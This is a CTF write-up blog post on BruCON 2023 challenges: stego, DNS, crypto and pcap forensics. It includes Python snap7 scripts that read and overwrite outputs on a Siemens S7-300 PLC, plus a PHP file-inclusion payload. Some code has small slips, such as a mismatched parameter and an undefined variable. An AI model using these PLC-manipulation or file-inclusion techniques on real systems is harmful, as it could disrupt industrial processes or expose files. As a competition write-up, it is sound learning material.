---
layout: post
title: "BruCON 2023 CTF"
author: cryptax
date: 2023-09-29
tags:
- Brucon
- CTF
- 2023
- stegano
- ICS
- PLC
- S7
- Regexp
- XOR
- DNS
---
# BruCON 2023 CTF

Many challenges, many flags in this CTF. I detail those I flagged or worked on with other team mates. Our team happily ranked 6th / 64.

## Forensics: Rexer

This is what the challenge says:

```
The pattern is the key.

\w*(3).+(T).*([s]).+(g).*([NT]r).*(u).+(L)\w+(Sm).*(N).*}$

asonV3l113UYnrvTfeJpsaeR}ZkJRvA{ThKgr730gnwWhYgVnNTSuhbpJ_BPn7Q8Q7mLnTrc_S3_p3zpFV8Fmm0hrUbvt_24upiqAt7ugXuhbpJ_BPn7Q8Q7mLq8qsSml4Sl4xmw1ON}

\2OREO\9{\8\6\4\4\7\1_\3\5\6\4\4\7\1}
```

The first pattern selects parts within the string (second line). Then, the third line re-assembles the selected groups to form the flag.

At first, I tried to use ChatGPT to help me out with the regexp. It didn't work out well and I used [Regex101](https://regex101.com).

![](/images/brucon2023_rexer.png)

This website is very convenient. See on the right how it tells me what are the letters in group `\1`, those in `\2`, those in `\3` etc.

Then, I had to re-assemble those characters from the 3rd line `\2OREO\9{\8\6\4\4\7\1_\3\5\6\4\4\7\1}` which gave the flag `TOREON{SmuggL3_sTruggL3}`.

I liked this challenge.

## Steganography

### Hidden in Brucon

*"It appears a flag has hidden itself inside the brucon logo, can you retrieve it?"*
A file named `brucon.jpg` is provided.

The solution was very easy:

```
$ file brucon.jpg 
brucon.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "TOREON{4lw4Ys_CHeck_MEt4Dat4}", progressive, precision 8, 842x595, components 3
```

Flag: `TOREON{4lw4Ys_CHeck_MEt4Dat4}`

### Hidden inside the House

```
One day, I got an email from a friend containing a picture. He never said why he sent me the photo, but all he said is he might need the file later. I wonder if there's more to this picture?
```

This time, we get a ZIP file.

```
$ unzip flag.zip
  inflating: flag.txt
$ cat flag.txt 
56 45 39 53 52 55 39 4f 65 32 59 77 63 6a 4e 4f 63 7a 46 6a 4e 58 30 3d
```

Obviously, that's ASCII characters, so I switch to a Python console:

```python
import binascii
>>> s='56 45 39 53 52 55 39 4f 65 32 59 77 63 6a 4e 4f 63 7a 46 6a 4e 58 30 3d'
>>> s.replace(' ', '')
'564539535255394f65325977636a4e4f637a466a4e58303d'
>>> binascii.unhexlify(s.replace(' ', ''))
b'VE9SRU9Oe2YwcjNOczFjNX0='
>>> import base64
>>> base64.b64decode(b)
b'TOREON{f0r3Ns1c5}'
```

The flag is `TOREON{f0r3Ns1c5}`. 

### You Are Significant

The title of this challenge makes me think about something around Least Significant Bit (LSB) or most significant one. We are provided with a file, `flag.png`. 

[Searching for steganography tools](https://book.hacktricks.xyz/crypto-and-stego/stego-tricks), I try [zsteg](https://github.com/zed-0xff/zsteg) which mentions that it detects "LSB steganography in PNG & BMP".

It works immediately:

```
$ zsteg flag.png 
imagedata           .. file: byte-swapped Berkeley vfont data
b1,rgba,lsb,xy      .. text: "===TOREON{5t3g4n0gr4PHy}===3"
b1,abgr,msb,xy      .. text: "33333333ww"
b2,rgba,lsb,xy      .. text: ["#" repeated 8 times]
b2,abgr,msb,xy      .. text: "_A-;o\rOucAa"
b3,g,lsb,xy         .. file: OpenPGP Secret Key
b3,a,msb,xy         .. file: ddis/ddif
b3,rgb,lsb,xy       .. text: "3=1mu8k1\r"
b3,rgba,lsb,xy      .. text: "awgEtWEtWi"
b3,rgba,msb,xy      .. text: "?o#>`#v`#"
b4,r,lsb,xy         .. text: "43\"\"33\"\"33ffww4Wf"
b4,r,msb,xy         .. text: ["3" repeated 10 times]
b4,g,lsb,xy         .. text: "EEEUUTUUUTEU\"5EUd["
b4,g,msb,xy         .. text: ["D" repeated 8 times]
b4,b,lsb,xy         .. text: "TTTDEEDEEUTT"
b4,b,msb,xy         .. text: "ffff\"\"\"\"ffff"
b4,rgb,lsb,xy       .. text: "0S$2T%UU&2@E<"
b4,bgr,lsb,xy       .. text: "P4$RU%U6 B5I"
b4,rgba,lsb,xy      .. text: "?$?%N%^U^&?$"
```

The flag is `TOREON{5t3g4n0gr4PHy}`.

### One Call Away

This time, we had to find a flag in a YouTube video.
The first step was to download the video, using in my case a browser extension ("YouTube 4K Downloader").

Then, if you play the video, it's actually only audio. We hear someone wants to send a text message to another one, and we distinctively hear the DTMF tones.

A team mate recovered the tones:
```
8 6 6 6 7 7 7 3 3 6 6 6 6 6 2 2 2 5 5 5 5 5 5 6 2 2 2 2 2 5 5
```

Then, we have to map that to characters. There are a few possibilities, but we quickly recognize the flag is starting with `TOREON`. To convert the tones, note that `777` can mean: `PPP`, or `PQ`, or `QP`, or `R`.

Then the audio is very much about texting someone so that s/he calls back. The rest of the message is then `CLLBAK` (call back).

The final flag is `TOREONCLLBAK`. We didn't flag it immediately because we tried lower case...


## PLC

### The Secret Ingredient

This is an OT challenge where we interact with a real PLC. We are asked to "get the PLC program and rescue the company secret located in datablock 23". The IP address of the PLC is `35.232.66.239:102`.

I solved this one with a team mate, and he did the most difficult part. This challenge was only worth 50 points in the end, I think it should have earned us more.

The PLC is a S7-300:

```
 nmap -Pn -sT -p102 --script s7-info 35.232.66.239
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-28 17:26 CEST
Nmap scan report for 239.66.232.35.bc.googleusercontent.com (35.232.66.239)
Host is up (0.11s latency).

PORT    STATE SERVICE
102/tcp open  iso-tsap
| s7-info: 
|   Module: 6ES7 314-6EH04-0AB0 
|   Basic Hardware: 6ES7 314-6EH04-0AB0 
|   Version: 3.3.10
|   System Name: S7-300 station_2
|   Module Type: Hard
|   Serial Number: S Q-E1U078232014
|_  Copyright: Original Siemens Equipment
Service Info: Device: specialized
```

On the web, I found several exploits from Beresford, 2011 which basically consisted in commanding several START and STOP of the PLC, and another one to dump the PLC's memory. I tried those scripts on metasploit but they wouldn't work (implementation error - probably no longer compatible with recent languages).

My team mate found a Python library, snap7, to discuss with the PLC.
The rack and slot depend on the PLC's model (here for a S7-300). The datablock number was provided in the description.

```python
import snap7
from snap7.util import *

plc_ip = "35.232.66.239"  # Replace with your PLC's IP address
rack = 0
slot = 2

plc = snap7.client.Client()
plc.connect(plc_ip, rack, slot)

db_number = 23 # Datablock number
start_byte = 0  
data_length = 100

# Read data from the data block
data = plc.read_area(snap7.types.Areas.DB, db_number, start_byte, data_length)

# Close the PLC connection
plc.disconnect()

# Display the data
print("Data read from PLC:")
print(data)
```

When we run this program, we get the following answer:

```
Data read from PLC:
bytearray(b'pp\x01\x01\x05\n\x00\x17\x00\x00\x00\x8e\x00\x00\x00\x00\x03J\x12\xa570\x03C*q70\x00\x1e\x00\x00\x00\x00\x00(CRIMINAL_HOPS\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x17\x00\x17\x00\x00\x00\x11\x04\n\x06\x04\x06\x04\x06\x04\x06\x04\x06\x04\x06\x04\x06\x04')
```

The description was asking for a *UUID* as flag, but that was an error. I could have searched for a long time, fortunately I tried *"CRIMINAL_HOPS"* by pure luck and that was the flag. The organizers explained that in other CTFs they were asking for the UUID and that this was an error.

### PLC: Rerouting the brew

In this second PLC challenge, we are now asked: *"Manipulate the outlow of the pressure tank by setting the PLC outputs 2,4 and 6. Verify the changes by verifying the datablock 42."*.

Same the solution below is mostly the work of a team mate.

```python
import snap7
import snap7.client as c
from snap7.util import *
from time import sleep

plc_ip = "34.123.131.215"  # Replace with your PLC's IP address
rack = 0  # Rack number (usually 0 for S7-300)
slot = 2  # Slot number (usually 2 for S7-300)


def WriteOutput(dev, bytebit, cmd):
    if bytebit in ['2.0', '4.0', '6.0']:
        byte, bit = bytebit.split('.')
        byte, bit = int(byte), int(bit)
        data = dev.read_area(snap7.types.Areas.PA, 0, byte, 1) # S7AreaPA
        set_bool(data, byte, bit, cmd)
        dev.write_area(0x82, byte, data)

def main():
    myplc = snap7.client.Client()
    myplc.connect(plc_ip, rack, slot)
    for x in range(10):
        WriteOutput(myplc, '2.0', True)  # Set output 2 to true
        WriteOutput(myplc, '4.0', True)  # Set output 4 to true
        WriteOutput(myplc, '6.0', True)  # Set output 6 to true
        sleep(1)
        
    # Read
    db_number = 42 # Datablock number
    start_byte = 0  
    data_length = 100
    # Read data from the data block
    data = plc.read_area(snap7.types.Areas.DB, db_number, start_byte, data_length)
    plc.disconnect()
    
    print("Data read from PLC:")
    print(" ".join(f"{byte:02X}" for byte in data))
    print(data)

if __name__ == "__main__":
    main()
```




## Web

### Web: Baby LFI

The description says: *"Local File Inclusions are so cool! Can you get the flag at /flag.txt?"* and leads to a web page which shows this piece of PHP code:

```php
<?php isset($_GET['file']) ? include_once($_GET['file']) : highlight_file('index.php') ?>
```

I tried http://URL/?file=flag.txt which returned several interesting warning messages.

```
Warning: include_once(flag.txt): Failed to open stream: No such file or directory in /var/www/html/index.php on line 1

Warning: include_once(): Failed opening 'flag.txt' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 1
```

They tell me that the file `flag.txt` is not found in the same directory as `index.php`. Actually, the description said to try `/flag.txt`, so that's what I tried http://URL/?flag=/flag.txt and got the flag `FLAG={Th4tW4s34444sy!}`. Yes, that was easy indeed.

### Web: Beginner LFI

Very similar to Baby LFI, this one says *"That last one was a bit too easy. Let's see if you can get past my filters! Can you get the flag at /flag.txt?"*

I probably did not understand what additional security there was, because the same request, http://URL/?flag=/flag.txt flagged: `FLAG={R3curs1v3Ch3cksAr3N33ded!}`

## DNS

### Do Not Search 1

This DNS challenge says: *"Do Not Search for the answer in brucon-ctf1.be."*. 

I immediately thought something would be hidden in a DNS answer. I tried `dig brucon-ctf1.be` which did not provide any useful information. 

I searched for "dns CTF" and found this interesting [writeup](https://ctftime.org/writeup/8874). I tried the `txt` command and it revealed the flag:

```
 dig brucon-ctf1.be txt

; <<>> DiG 9.18.12-0ubuntu0.22.04.3-Ubuntu <<>> brucon-ctf1.be txt
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 47012
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;brucon-ctf1.be.			IN	TXT

;; ANSWER SECTION:
brucon-ctf1.be.		1121	IN	TXT	"TORFLAG:602C0CC369C134E25861F335EC1F290E"
```

The flag is `TORFLAG:602C0CC369C134E25861F335EC1F290E`. The flag format wasn't fixed in this CTF.

### Do Not Search 3

Same, but you need to search for `brucon-ctf3.be`. Actually the same solution worked again: `dig brucon-ctf3.be txt` and revealed the flag: `TORFLAG.ECCBC87E4B5CE2FE28308FD9F2A7BAF3` (without trailing dot at the end).

```
;; ANSWER SECTION:
brucon-ctf3.be.		13774	IN	CNAME	TORFLAG.ECCBC87E4B5CE2FE28308FD9F2A7BAF3.
```

### Do Not Search 2

Find information on `brucon-ctf2.be`, but this time `txt` did not provide the flag. This information was in the TXT record:

```
;; ANSWER SECTION:
brucon-ctf2.be.		7168	IN	TXT	"v=spf1 a mx ip4:185.182.56.120 a:spf.spamexperts.axc.nl ~all"
```

As this was about spam and mail MX record, I tried the MX record:

```
dig brucon-ctf2.be mx
...
;; QUESTION SECTION:
;brucon-ctf2.be.			IN	MX

;; ANSWER SECTION:
brucon-ctf2.be.		4303	IN	MX	20 TORFLAG.BC3C1A70072998AFA42892CF9F880DB4.
brucon-ctf2.be.		4303	IN	MX	10 mail.brucon-ctf2.be.
```

The flag did not have the trailing dot: `TORFLAG.BC3C1A70072998AFA42892CF9F880DB4`.

## Crypto: Dragon's Crib

Our team spent considerable time on this challenge, which only provided 50 points in the end. True, it was easier than I had expected, but still I think it deserved more points.

We are provided with an encryption algorithm, implemented in Python, and 5 ciphertexts:

```python
import binascii
import random
import sys

SEED = random.randint(0, 2**32)

def encrypt(plain: str) -> bytes:
    random.seed(SEED)
    return bytes(x ^ random.randint(0, 256) for x in plain.encode())

def main():
    for line in sys.stdin:
        print(binascii.hexlify(encrypt(line.strip())).decode())

if __name__ == "__main__":
    main()
```


In this program, the plaintext is XORed with a random byte. Note the program has an error: it's not `randint(0,256)` because this can produce 256 which no longer fits in a byte. Rather it should be `randint(0,255)`. I went to see the organizers about this, they confirmed the issue but commented it would not pose a problem to solve the challenge. So, just think we have `randint(0,255)`.

Those are the provided ciphertexts:
```
f2017621a7a9f7d2d38d96e22d70de2c427b83cc8f18174e7bd38d483100d9a4e80b7568e1bdbbdcf65531
f1017c20a7a9f0d5d48cd3fb6c608c24003d9dc88e5b040b6dd8cc4c31029deae808742ca58fb9d6aa
f5017673a9ece8c8909cdef06c65922c053d82c0991f17003fc5894a2e4e90a4a90e757ee180aecef012
eb08783aaceeb8d5c4c8d9fb207ade3f077c89c19c191e0b3fd5830f2a069ceaff036275e18caecef010
f2017227e2eff4ddd7c8dfe66c41ac182152a4d2aa13321a40f38456335d8a95de5764649eaaffcfef0160
```


Second we notice that the encryption starts by seeding the random generator. So each ciphertext will be XORed by the **same sequence of bytes**. And this is inherently insecure: XOR is solid as long as the key is never reused...

Then, we imagined we could work out the sequence of bytes. We thought we could bruteforce all seeds and test whether the ciphertext would decrypt to correctly readable text. However, there are 2**32 possible seeds, and while not huge, this is absolutely too long to be bruteforced by our laptops (we tried...).

The solution was to find how to break this knowing that we had several ciphertexts. A team mate spotted [this website](https://toolbox.lotusfa.com/crib_drag/). The name is close to the title of the challenge, so it looks like it's the correct direction.

Actually [this other website](http://cribdrag.com) does the same but easier to use IMHO. How do you use this website? On the left, you put one ciphertext, on the right another one. For example the first and the fifth. Then you need to guess character by character what the first line contains and see the result at the same time for the fifth line, which guides you as to which characters should be correct in the crib word.

![](/images/brucon2023-cribdrag.png)





## CTI

Those were several challenges on Critical Infrastructure. For all of them, we had a common pcap and smbp file

### Find the PDF

This challenge asked *"Find the PDF document file name within the network packet capture"*. 

We didn't even need to load the Pcap in Wireshark. Mere strings on the pcap and grepping on pdf revealed the name of the PDF. The flag was the name of the PDF.

```
$ strings Incident1.1.1.pcap | grep pdf
STOR Architecture Dossier-BruCON Brewery V2.0.pdf
MDTM 20230901120136 Architecture Dossier-BruCON Brewery V2.0.pdf
...
```

### Which subnet

*"Which subnet from the enterprise domain network exfiltrates the PDF document?"*

![](/images/brucon2023-ftp.png)

IP address 192.168.124.128 is getting the PDF via FTP. The FTP server is 192.168.170.215. We struggled a long time on this one, because we thought we had to supply `192.168.0.0/16` as answer, and it did not work.

In the end, I asked an organizer who made me understand he wasn't expecting a *technical representation* of the subnet but it's name in the network architecture diagram. This diagram was supplied in a PDF for the CTI Architecture challenges.

![](/images/brucon2023-marketing.png)

We see the PDF is exfiltrated from a workstation in the Marketing subnet. *Marketing* was the flag.

### Devices

*"How many devices did communicate with the PLC"*

Devices who communicate with a PLC use the ModBus protocol. We can filter such packets in Wireshark with the filter "mdtcp" (or we could have filtered communications to the PLC's IP address).

In ModBus we have communications between 192.168.174.242 and

- 192.168.170.240 (SCADA)
- 192.168.174.99 (PLC)
- 192.168.174.245 (PLC)

To be honest, when I flagged I hadn't understood this at all, and tried 1, then 2 and happily got the flag with answer `3`...

### Mac Addy

*"What is the MAC address of the PLC?"*

I solved this one by looking at the file `GRC_known_good.smbp` first. It's an XML file and we see this IP address:
```
          <IpAddress>192.168.174.242</IpAddress>
          <GatewayAddress>192.168.174.1</GatewayAddress>
```
So, then I looked for `192.168.174.242` in Wireshark and found its MAC address: `00:80:f4:0e:8d:13`. This was the flag.

## CTI Architecture

For those challenges, we were given a 9-page PDF titled "BruCON Brewery Architecture Dossier". [PDF](/source/CTF_Architecture_Dossier-BruCON_Brewery_V2.0.pdf).

The point of all challenges in this section was to read this PDF and comment it on a security point of view. The issue is that the expected answers weren't technical ones like "an attacker can send a phishing email to crab the credentials of an employee" but high level concepts.

The first question consisted in commenting what was mainly missing in the network diagram. Basically, the issue was that there was no firewall to secure the traffic inside the company between subnets. The expected answer was something like "micro segmentation", "IEC64443" and "Purdue Model".

There was a question on flaws of the logging system. The first issue I saw was that it would be possible to erase logs. The solution they expected was how to solve it, such as duplicating the logs, if possible in another branch of the company physically located elsewhere.

There were also questions about remote access of employees and issues with how it was designed. A first flag came by saying that whitelisting IP addresses was insufficient to guarantee the connection came from an employee and that 2FA could be a solution to partly remedy the issue. Another flag came by arguing that there was no VPN from the employee's location to the enterprise. Discussed about the fact that employees were actually not authentified and that the enterprise has no real idea who they were, just that they were authorized or not, and that the inner RBAC strategy should have been deployed also externally.

While those challenges were interesting, I regret that the solution was too much to talk your way out to get the flag. I would have preferred a very strictly formatted flag based on more precise questions. But overall, the idea of studying the PDF was excellent.



## My opinion

Positive aspects:

- It is really interesting to have  a full document with network and architecture diagrams of what looks like a real beer brewery. It makes the challenges feel real and I appreciated the time the organizers took to prepare such a scenario
- I enjoyed the PLC challenges where we used and hacked into real PLCs. We don't have PLC-related challenges very often in CTFs (because it's difficult to set up) and I found that lovely.
- I was a bit reluctant on the CTI architecture challenges where we had to go and explain our solution to organizers to get the flag. I wasn't at ease with that at the beginning, but in the end, (1) organizers weren't trying to trap us and would give flags quite freely if they had heard more or less what they wanted, and (2) it helped work on challenges that were *real*. Working on paper, diagrams etc is also part of the job sometimes, so it's a good idea.
- Several challenges were very easy giving everybody the opportunity to flag at least a couple of times.

Negative aspects:

- There were perhaps too many of those very very very easy challenges.
- We need a flag format, and the flag format must be used for every challenge. We don't want to have to guess "is that the flag they are waiting for, or should I find something more?".
- Some descriptions were misleading, like the PLC challenges were requesting an UUID as flag... but error it wasn't a UUID.
- Too many points were attributed to the CTI Architecture challenges IMHO. The issue is that the borders of each challenge in that section weren't well defined. For instance, if you find an issue with RDP, you don't know if that's the first issue, the second or the third. Fortunately, organizers were cool on that.
- There were too many "unconventional" challenges (CTI, CTI Architecture) and not enough "standard" challenges in contrast. I did appreciate the unconventional ones though, just perhaps the ratio was a bit too much.
- Do not create challenges where the same solution can be applied to different challenges like DNS 1 and DNS 2, or Web 1 and Web 2. I believe this is a testing issue.








